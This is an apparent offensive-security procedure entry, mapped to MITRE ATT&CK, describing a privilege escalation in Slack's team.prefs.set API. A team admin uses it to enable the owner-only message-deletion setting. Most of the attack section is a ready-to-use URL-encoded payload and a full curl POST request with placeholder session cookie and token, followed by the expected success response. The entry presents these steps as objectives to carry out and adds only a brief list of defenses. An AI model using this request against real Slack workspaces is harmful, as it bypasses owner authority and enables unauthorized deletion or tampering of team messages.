---
id: proc-uuid-2
name: Modify Slack Team Preferences via API
tags:
  - privilege-escalation
  - api
  - slack
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/slack-team-prefs-set]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:28:44.780Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Modify Slack Team Preferences via API

## Summary

This procedure exploits insufficient authorization in Slack's /api/team.prefs.set endpoint, allowing a team admin to set the owner-restricted 'allow_message_deletion' preference to true, enabling admins to delete messages team-wide.

## Description

The vulnerability stems from missing checks that prevent team admins from modifying preferences reserved for team owners. By crafting a POST request with encoded JSON payload, an admin can escalate privileges. This targets Slack teams with the API accessible via web sessions and assumes prior authentication. Outcomes include unauthorized permission changes, potentially leading to data tampering.

## Requirements

1. Authenticated session as team admin (cookies and token)
2. Knowledge of team subdomain (e.g., teamname.slack.com)
3. HTTP client like curl

## Defense

Defensive measures and detection strategies:

- Implement strict role-based access controls on API endpoints
- Log and alert on preference changes outside owner sessions
- Audit team settings regularly for unauthorized modifications

## Objectives

1. Bypass owner restrictions to enable message deletion
2. Escalate admin privileges to control team-wide settings
3. Validate the change without owner intervention

## Instructions

### Step 1: Prepare the Payload

**Context**: Encode the preferences JSON to include the target setting.

No command; manually URL-encode: prefs=%7B%22msg_edit_window_mins%22%3A%221%22%2C%22allow_message_deletion%22%3Atrue%7D

> This sets message edit window to 1 minute and enables deletion.

### Step 2: Execute the API Request

**Context**: Send the POST to modify settings using admin credentials.

**Command** ([[commands/slack-team-prefs-set]]):
```bash
curl -X POST 'https://teamname.slack.com/api/team.prefs.set?t=1423146704' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Referer: https://teamname.slack.com/admin/settings' \
  -H 'Cookie: _ga=GA1.2.630936366.1423056192; a-3204538285=..' \
  -d 'prefs=%7B%22msg_edit_window_mins%22%3A%221%22%2C%22allow_message_deletion%22%3Atrue%7D&token=xoxs-xxxx&set_active=true&_attempts=1'
```

> Response should be {"ok":true,"prefs":{"allow_message_deletion":true}} indicating success.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation

### Sub-Techniques


## Commands Used

- [[commands/slack-team-prefs-set]]

## Tools Used


## Tags

- privilege-escalation
- api
- slack
